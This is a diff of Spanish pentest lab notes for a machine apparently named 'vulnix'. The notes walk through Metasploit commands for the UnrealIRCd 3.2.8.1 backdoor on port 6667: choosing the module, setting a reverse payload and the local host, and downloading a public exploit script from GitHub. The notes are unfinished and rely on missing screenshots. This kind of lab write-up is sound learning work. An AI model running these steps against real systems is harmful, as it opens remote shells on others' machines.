@@ -36,12 +36,57 @@ podemos seguir intentando fuzz y gobuster subdomains
 
 De la web no sacamos nada
 Pasamos al siguiente puerto 6667
+
+ instantamos explotarlo con metaexploit:
+ comandos 
+ msfconsole
+![[vulnix real msfconsole.png]]
+
 y buscando un poco por internet vemos que es vulnerable con metaexploit: 
 https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/
 vamos a intentar explotarlo segun lo encontrado
 
+![[searchUnreal vulnix real.png]]
 
 
+Use 2
+![[use2 vulnix real.png]]
+
+Options
+![[vulnix real options.png]]
+
+set rhost = IP:
+![[set rhjost vulnix real.png]]
+
+set rport  6667
+
+![[set report 6667 vulnix real.png]]
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+![[vulnix real use exploit irc unreal.png]]
+
+show payloads:
+![[show payloads vulnix real.png]]
+
+set payload reverse:
+![[set pauload reverse vulnix real.png]]
+
+set lhosts = local IP:
+![[setlhost vulnix real.png]]
+
+
+exploit
+![[vulnix real exploit.png]]
+but No sessions was created.
+
+Buscando un poco por internet encontramos el repo de github
+
+https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor
+
+descargamos el exploit .py
+wget https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py
+
+![[descargar exploit del repo de github.png]]
 Exploit:: faltan pantallazos y comandos
 
 
